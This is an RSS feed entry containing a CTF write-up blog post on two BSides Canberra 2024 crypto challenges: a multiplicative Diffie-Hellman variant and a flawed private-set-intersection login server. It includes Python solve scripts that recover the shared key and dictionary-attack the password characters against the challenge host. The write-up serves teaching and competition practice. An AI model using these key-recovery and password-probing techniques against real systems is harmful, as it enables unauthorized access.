<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>writeups on teddyctf</title>
    <link>https://TheSavageTeddy.github.io/categories/writeups/</link>
    <description>Recent content in writeups on teddyctf</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>teddyctf</copyright>
    <lastBuildDate>Sat, 28 Sep 2024 15:53:20 +0800</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Crypto Writeups - BSides Canberra CTF 2024</title>
      <link>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/</link>
      <pubDate>Sat, 28 Sep 2024 15:53:20 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/</guid>
      <description>Overview Last week I went to BSides Canberra 2024 to see the amazing talks, meet people, and of course, play CTF. After 2 days of solving interesting challenges, my team Emu Exploit managed to get 2nd place overall!
I was basically the only person in the team who was willing to do crypto :&amp;lt; so I decided to write up the crypto challenges I solved. Enjoy!
Challenges Overview Challenge Category Solves Discrete Add-a-rithm crypto 43 Psionic crypto 10 Public Service crypto 8 arpeeceethree crypto 3 Discrete Add-a-rithm - 43 solves You enter a room.</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Last week I went to BSides Canberra 2024 to see the amazing talks, meet people, and of course, play CTF. After 2 days of solving interesting challenges, my team &lt;a href=&#34;https://x.com/EmuExploit&#34;&gt;Emu Exploit&lt;/a&gt; managed to get 2nd place overall!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;I was basically the only person in the team who was willing to do crypto :&amp;lt; so I decided to write up the crypto challenges I solved. Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;43&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#psionic---10-solves&#34;&gt;Psionic&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#public-service---8-solves&#34;&gt;Public Service&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#arpeeceethree---3-solves&#34;&gt;arpeeceethree&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm - 43 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You enter a room. On the wall is a large tapestry showing two people exchanging gifts. What could it mean?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are provided with two files, &lt;code&gt;discreteAddarithm.py&lt;/code&gt; and &lt;code&gt;out.txt&lt;/code&gt;&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;discreteAddarithm.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.Util.number import getPrime, getRandomInteger, getRandomRange
from Crypto.Protocol.KDF import HKDF
import Crypto.Hash.SHA512 as sha512
import Crypto.Cipher.AES as aes
from Crypto.Util.Padding import pad, unpad
from binascii import * 
from cybearssecrets import flag

def generateParameters(bitlen=1024):
	p = getPrime(bitlen)
	gen = getRandomRange(2,p-1)
	return gen, p

def generateKeyPair(p, gen):
	privateKey = getRandomRange(2,p-1)
	publicKey = privateKey*gen % p
	return privateKey, publicKey

def generateSharedSecret(p, recipientPrivateKey, senderPublicKey):
	sharedSecret = recipientPrivateKey*senderPublicKey % p
	return sharedSecret

## Init
gen, p = generateParameters()
print(&amp;#34;gen = {}&amp;#34;.format(gen))
print(&amp;#34;p = {}&amp;#34;.format(p))

## A: Alice generates her pub/priv key pair
aPrivateKey, aPublicKey = generateKeyPair(p, gen)

## B: Bob generates his pub/priv key pair
bPrivateKey, bPublicKey = generateKeyPair(p, gen)

## A: Alice sends Bob her public key
print(&amp;#34;aPublicKey = {}&amp;#34;.format(aPublicKey))

## B: Bob sends Alice his public key
print(&amp;#34;bPublicKey = {}&amp;#34;.format(bPublicKey))

## A: Alice caluculates the shared secret
aSharedSecret = generateSharedSecret(p, aPrivateKey, bPublicKey)

## B: Bob caluculates the shared secret
bSharedSecret = generateSharedSecret(p, bPrivateKey, aPublicKey)

## Prove that they match
assert(aSharedSecret == bSharedSecret)

## A: Alice encrypts a message to Bob
aSessionKey, aIV = HKDF(long_to_bytes(aSharedSecret), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
a = aes.new(aSessionKey, aes.MODE_CBC, iv=aIV)
aCipher = a.encrypt(pad(flag,16))

print(&amp;#34;aCipher = {}&amp;#34;.format(hexlify(aCipher)))

## B: Bob decrypts the message
bSessionKey, bIV = HKDF(long_to_bytes(bSharedSecret), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
b = aes.new(bSessionKey, aes.MODE_CBC, iv=bIV)
bPlain = unpad(b.decrypt(aCipher), 16)

if (bPlain == flag):
	print(&amp;#34;Successful decryption!&amp;#34;) 
else:
	print(&amp;#34;Error - something went wrong&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;682197534&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;682197534&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;text&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;out.txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-text&#34; &gt;&lt;code&gt;
gen = 107665309954437515284050955368964848368303288172119448977068684165707548536106035934408882308704533335892101447750709116199826328820028967921540045634698373851938861013761725712688725891129665455073194344098566187055873775659411023106521425479072045658166413360399757570409372209072730576562842193768242314124
p = 154305601419430130125267211117098923915333624355567046250094074039674228187186943601303157833374662739969026864299363336407319080223107540886546467388611809417774875857578639486137855088896821184616399750557477866148643263803196632154429856293530179926011705130915364080130059881980341409627009701357523451267
aPublicKey = 80354936104370249925868492705190743680652231716704224547570074631753287352078443184923555333860525866848256788314156023903492043171511797029693297228294483818872563765707539175061570839714448005871291987391648926205060807957012526950116361633119573934316064444374124669861697695772912934202842834007697535925
bPublicKey = 42387482047117421466928118692687568439415997629141048723182072767997284324764640343272008345119819287526375581385721174494274510726524360731480638585425669685247170958054446797249761744238847427213615385731375648168698821769635116850680245545304663686514311913787022427877096835277158288159213482962236809739
aCipher = b&amp;#39;618fa12c3a6a6956a47a91bec13f9e1fe2d1031ba2f40a42b4f4d1d9757d0195ea6215fd694c2b99cf9a00be97b46791&amp;#39;
Successful decryption!
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It is essentially &lt;a href=&#34;https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange&#34;&gt;Diffie Hellman key exchange&lt;/a&gt;, but with multiplication instead of exponentiation:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$p$ is a random 1024-bit prime&lt;/li&gt;
&lt;li&gt;$g$ (&lt;code&gt;gen&lt;/code&gt;) is a random integer from $2$ to $p-1$&lt;/li&gt;
&lt;li&gt;Alice generates her private key $a$ and computes her public key $A = a \times g \bmod{p}$&lt;/li&gt;
&lt;li&gt;Bob generates his public key $b$ and computers his public key $B = b \times g \bmod{p}$&lt;/li&gt;
&lt;li&gt;We are given $p$, $g$, $A$ and $B$&lt;/li&gt;
&lt;li&gt;The shared secret $s$ is calculated such that $s = A \times b = a \times g \times b = B \times a \bmod{p}$, and used as an AES key to encrypt the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Diffie Hellman leverages the discrete logarithm problem to make retrieving the private key from the public key difficult. However, in this challenge, multiplication is used instead of exponentiation to compute the public key, as $A = a \times g \bmod{p}$ instead of $A = a^g \bmod{p}$.&lt;/p&gt;
&lt;p&gt;Therefore, we can simply rearrange for the private key $a = A \times g^{-1} \bmod{p}$, then calculate the shared secret $s = a \times B \bmod{p}$, and decrypt the flag using the shared secret as the AES key.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.Protocol.KDF import HKDF
import Crypto.Hash.SHA512 as sha512
import Crypto.Cipher.AES as aes

# values
g = 107665309954437515284050955368964848368303288172119448977068684165707548536106035934408882308704533335892101447750709116199826328820028967921540045634698373851938861013761725712688725891129665455073194344098566187055873775659411023106521425479072045658166413360399757570409372209072730576562842193768242314124
p = 154305601419430130125267211117098923915333624355567046250094074039674228187186943601303157833374662739969026864299363336407319080223107540886546467388611809417774875857578639486137855088896821184616399750557477866148643263803196632154429856293530179926011705130915364080130059881980341409627009701357523451267
A = 80354936104370249925868492705190743680652231716704224547570074631753287352078443184923555333860525866848256788314156023903492043171511797029693297228294483818872563765707539175061570839714448005871291987391648926205060807957012526950116361633119573934316064444374124669861697695772912934202842834007697535925
B = 42387482047117421466928118692687568439415997629141048723182072767997284324764640343272008345119819287526375581385721174494274510726524360731480638585425669685247170958054446797249761744238847427213615385731375648168698821769635116850680245545304663686514311913787022427877096835277158288159213482962236809739
enc =  bytes.fromhex(&amp;#39;618fa12c3a6a6956a47a91bec13f9e1fe2d1031ba2f40a42b4f4d1d9757d0195ea6215fd694c2b99cf9a00be97b46791&amp;#39;)

# solve
a = (A * pow(g, -1, p)) % p
s = (a * B) % p

aSessionKey, aIV = HKDF(long_to_bytes(s), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
a = aes.new(aSessionKey, aes.MODE_CBC, iv=aIV)
flag = a.decrypt(enc)
print(f&amp;#34;{flag = }&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Flag: &lt;code&gt;cybears{C3rt41nly_ADDS_s0m3_pr0bl3ms}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;psionic---10-solves&#34;&gt;Psionic - 10 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The cybears face a door with a large wooden face carved into it. Surprisingly, the face starts moving and speaking! &amp;ldquo;Speak the password to enter&amp;rdquo; booms the door&amp;hellip; the cybears consider their options..&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc psionic.chal.cybears.io 2323&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This was a really weird challenge. We are given server code and an instance to connect to:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;198463275&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;198463275&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

from hashlib import sha1
from Crypto.Util.number import bytes_to_long, long_to_bytes, getRandomInteger, getPrime
import ast
import sys
import json

# This cybears.py file is not included in the handout.
# If you&amp;#39;d like to test locally, create a cybears.py file and put sensible variables in there
from cybears import secret_password, secret_password_chars, flag

# Server-client authentication protocol, but utilising Private-Set-Intersection
# Based on https://csrc.nist.gov/CSRC/media//Projects/pec/documents/stppa-02-PSI-rosulek.pdf

# Client ------------- Server
# 1. {H(p1)^a, H(p2)^a ... } -&amp;gt; 
# 2.               &amp;lt;- {H(s1)^b, H(s2)^b, ..., H(p1)^a^b, H(p2)^a^b... }
# 3. {H(s1)^b^a, H(s2)^b^a, ...} 
# 4. Client checks whether any of the H(s_i)^b^a == H(p_j)^a^b
# 5. Server does same
# 6. If all p_i == s_j, allow client to submit H(nonce || password) for flag! 


def validate_client(client1): 
    result = False
    output = {}

    # parse input 
    try:
        c = ast.literal_eval(client1)
    except Exception as e: 
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        return result, output    

    # Check that we have a set
    if type(c) != list: 
        return result, output

    # Check that all elements in the list are integers
    if all(list(map(lambda x: type(x) == int, c))) != True: 
        return result, output

    result = True
    output = c
    return result, output 


if __name__ == &amp;#34;__main__&amp;#34;:

    # Generate ephemeral server public/private keys
    generator = 2
    public_prime = getPrime(1024)
    server_private = getRandomInteger(1024)
    server_public = pow( 2, server_private, public_prime)
    params = { &amp;#34;prime&amp;#34; : public_prime, &amp;#34;generator&amp;#34;: generator, &amp;#34;server_public&amp;#34; : server_public } 
    


    print(&amp;#34;Welcome to the psionic login server!&amp;#34;)
    print(&amp;#34;params = {}&amp;#34;.format(json.dumps(params)))
    print(&amp;#34;Please enter your set of passwords and we will confirm there is a match:&amp;#34;)

    # 1. client to send commitment
    client1 = input() #expect single string of len(password) entries as a list
    
    result, output = validate_client(client1)
    if result == False: 
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        sys.exit(-1)
    
    if len(output) != len(secret_password):
        print(&amp;#34;Incorrect length - must same length as password&amp;#34;)
        sys.exit(-1)
        
    # 2. server to send commitment
    server_response1 = list(map(lambda x : pow(x, server_private, public_prime), output))
    server_response2 = list(map(lambda x : pow(bytes_to_long(sha1(x.encode()).digest()), server_private, public_prime), secret_password_chars))
    print(&amp;#34;{}&amp;#34;.format(server_response1 &amp;#43; server_response2))

    # 3. client to send verification
    client2 = input() #expect single string of len(password) entries as a list

    result2, output2 = validate_client(client2)
    if result2 == False:
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        sys.exit(-1)

    if len(output2) != len(secret_password):
        print(&amp;#34;Incorrect length - must same length as password&amp;#34;)
        print(&amp;#34;DEBUG: {} / {}&amp;#34;.format( len(output), len(secret_password)))
        sys.exit(-1)

    # 5. Server validation - confirm that { H(p_i)^b^a } == {H(s_i)^a^b}
    # Client could just replay, but we don&amp;#39;t just accept this as proof of knowing the password! 
    print(&amp;#34;checking...&amp;#34;)
    
    if (set(output2) == set(server_response1)): 
        print(&amp;#34;Sets are a match! You must know the password!&amp;#34;) 
        print(&amp;#34;Send it through&amp;#34;) # TODO, hash with a nonce? 
        
        client_password = input()
        if(client_password == secret_password): 
            print(&amp;#34;Correct! Here is your flag: {}&amp;#34;.format(flag))
            sys.exit(0)
        else: 
            print(&amp;#34;Incorrect password&amp;#34;)
            sys.exit(-1)
    else:
        print(&amp;#34;Set mismatch. You don&amp;#39;t know the password!&amp;#34;)
        sys.exit(-1)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It&amp;rsquo;s supposedly some sort of &amp;ldquo;Private Set Intersection&amp;rdquo; (PSI), where we need to provide integers (being characters of the password), and it will tell us how many of those are part of the password, and we provide the full password to get the flag.&lt;/p&gt;
&lt;p&gt;Lets step through the server code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, we&amp;rsquo;re provided with some parameters, a prime $p$, generator $g$ and server public value $v = g^y \bmod{p}$ where $y$ is the server private value (These turn out to be useless, so we can kind of just ignore this).&lt;/li&gt;
&lt;li&gt;Next, it prompts us for a list of integers $X = \{x_0, x_1, &amp;hellip;, x_n\}$, and the list must be the same length as the password&lt;/li&gt;
&lt;li&gt;It then loops through the list of integers $X$ and computes $H_X = x_n^y \bmod{p}$ for each item $x_n$ in our list $X$, where H(x) is the SHA1 hash function.&lt;/li&gt;
&lt;li&gt;It does a similar operation for the password chars, computing $H_Z = H(z_n)^y \bmod{p}$ for each character $z_n$ in the password $Z$.&lt;/li&gt;
&lt;li&gt;It sends us both $H_X$ and $H_Z$, which are &amp;ldquo;hidden&amp;rdquo;, hashed values used to compute the private set intersection.&lt;/li&gt;
&lt;li&gt;We are prompted again to provide another list of integers, and the server will check if this list is equal to $H_X$. This step doesn&amp;rsquo;t really make sense since the server sends us $H_X$, so all we have to do is repeat it back.&lt;/li&gt;
&lt;li&gt;If equal, we will be prompted to enter the password as a string, and if the password is correct, we get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The code really confused me as I wasn&amp;rsquo;t sure what the challenge was here. I looked at the &lt;a href=&#34;https://csrc.nist.gov/CSRC/media//Projects/pec/documents/stppa-02-PSI-rosulek.pdf&#34;&gt;link provided in the code&lt;/a&gt; which was an overview on Private Set Intersection, and saw that just hashing elements of the set was bad for PSI.&lt;/p&gt;

  &lt;img src=&#34;./img/bad_psi.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;This is because the point of a private set intersection is for two parties, each with their own private set of data, to compute the intersection between the two sets, &lt;strong&gt;without&lt;/strong&gt; either party learning about the whole private set of the other.&lt;/p&gt;
&lt;p&gt;One (bad) way to do this is for you to hash all elements of your set, and the other party does the same. Then you can compare hashed elements - as identical elements hash to the same digest, you can perform PSI by computing the intersection between sets containing the hashed elements. But the link mentions this is a bad way to do it, because you can use a dictionary attack, hashing all possible values of elements in the set, and comparing it to the hash digest of the other party, learning about their elements if hash digests match.&lt;/p&gt;
&lt;p&gt;However, the server seems to mitigate this - recall that our &amp;ldquo;hidden&amp;rdquo; set is $H_X = x_n^y \bmod{p}$, and we don&amp;rsquo;t know the server private value $y$, so we cannot compute this ourselves. But almost the same method is used to generate the password, $H_Z = H(z_n)^y \bmod{p}$, and the server sends us both these sets. Therefore, we can send $X = \{H(&amp;ldquo;a&amp;rdquo;), H(&amp;ldquo;b&amp;rdquo;), &amp;hellip;\}$ and the server will compute $H_X = x_n^y \bmod{p}$ which will be $\{H(&amp;ldquo;a&amp;rdquo;)^y, H(&amp;ldquo;b&amp;rdquo;)^y, &amp;hellip;\}$, and we can compute this set to the password set which will be $\{H(z_0)^y, H(z_1)^y, &amp;hellip;, H(z_n)^y\}$ and intersect these two sets. An element in both these sets reveals a character of the password.&lt;/p&gt;
&lt;p&gt;The server imports the secret password and password chars:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This cybears.py file is not included in the handout.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you&amp;#39;d like to test locally, create a cybears.py file and put sensible variables in there&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cybears &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; secret_password, secret_password_chars, flag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I assumed &lt;code&gt;cybears.py&lt;/code&gt; would look something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password_chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(secret_password)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cybears&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{testing}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But after my solve script worked local but not on remote, I asked the challenge author if &lt;code&gt;secret_password&lt;/code&gt; and &lt;code&gt;secret_password_chars&lt;/code&gt; were constnat on the server. As it turns out, while &lt;code&gt;secret_password&lt;/code&gt; is constant, &lt;code&gt;secret_password_chars&lt;/code&gt; is not - it&amp;rsquo;s scrambled! Which means &lt;code&gt;cybears.py&lt;/code&gt; probably looks something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password_chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(list(secret_password))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cybears&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{testing}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Knowing this, I came up with the solution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Brute force a little bit to get the password length (server will error if provided integer list not same length as password), which turned out to be 11&lt;/li&gt;
&lt;li&gt;Check what characters were in the password, by sending integers from 0 to 255, 11 at a time, and intersecting the sets returned from the server. Technically, the sets returned by the server were lists, so we can note the indexes of elements that intersected to know which character is in the password.&lt;/li&gt;
&lt;li&gt;Attempt to unscramble the characters to form a password, such as by using an anagram solver.&lt;/li&gt;
&lt;li&gt;Submit password and get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I found it really weird that I had to unscramble the password, it didn&amp;rsquo;t seem to make sense that &lt;code&gt;secret_password_chars&lt;/code&gt; was scrambled, as otherwise, you could easily correlate the indexes of intersecting elements to know what character is in what position. My best guess for why it was scrambled would be that the challenge author wanted to simulate the unordered nature of sets. If anyone knows why, please let me know!&lt;/p&gt;
&lt;p&gt;After running a script to get all the chars, we get characters &lt;code&gt;[&#39;!&#39;, &#39;1&#39;, &#39;A&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;l&#39;, &#39;m&#39;, &#39;o&#39;, &#39;r&#39;, &#39;t&#39;]&lt;/code&gt;. Convering some from l33t c0d3 and putting it in an anagram solver, we get &lt;code&gt;Algorithm&lt;/code&gt; as a potential word. Then we can start to guess passwords, and the correct one turns out to be &lt;code&gt;Algorithm1!&lt;/code&gt;, which gets us the flag.&lt;/p&gt;
&lt;p&gt;Solve scripts:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;869173425&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;869173425&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_pw_chars.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *
from Crypto.Util.number import *
import json
import string
from hashlib import sha1

pw_chars = []

step = 11
for i in range(0, 256, step):
    r = remote(&amp;#34;psionic.chal.cybears.io&amp;#34;, 2323)
    # r = remote(&amp;#34;localhost&amp;#34;, 1111)

    r.recvline()
    r.recvuntil(b&amp;#34;params = &amp;#34;)
    params = json.loads(r.recvline().strip().decode()) # unused
    r.recvuntil(b&amp;#34; match:&amp;#34;)
    
    arr_raw = [chr(v) for v in range(i, i&amp;#43;step)]
    arr = [bytes_to_long(sha1(v.encode()).digest()) for v in arr_raw]

    r.sendline(str(arr).encode())
    r.recvline()

    resp = eval(r.recvline().strip().decode())
    H_X, H_Y = resp[:11], resp[11:]

    for xi, x in enumerate(H_X):
        for yi, y in enumerate(H_Y):
            if x == y:
                pw_chars.append(arr_raw[xi])

print(f&amp;#34;{pw_chars = }&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;375196824&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;375196824&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_flag.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *
from Crypto.Util.number import *
import json
import string
from hashlib import sha1

pw_chars = []
r = remote(&amp;#34;psionic.chal.cybears.io&amp;#34;, 2323)
# r = remote(&amp;#34;localhost&amp;#34;, 1111)

r.recvline()
r.recvuntil(b&amp;#34;params = &amp;#34;)
params = json.loads(r.recvline().strip().decode()) # unused
r.recvuntil(b&amp;#34; match:&amp;#34;)

arr_raw = [chr(v) for v in range(0, 11)]
arr = [bytes_to_long(sha1(v.encode()).digest()) for v in arr_raw]

r.sendline(str(arr).encode())
r.recvline()

resp = eval(r.recvline().strip().decode())
H_X, H_Y = resp[:11], resp[11:]

r.sendline(str(H_X).encode())

r.sendline(b&amp;#34;Algorithm1!&amp;#34;)
r.interactive()

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Flag: &lt;code&gt;cybears{n0t_s0_pr1v@t3_int3rs3ct10n}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This was a unique challenge, different to most crypto chals, but I didn&amp;rsquo;t really like having to guess the password from a set of characters - I thought that was a bit guessy and I was lucky to have guessed it.&lt;/p&gt;
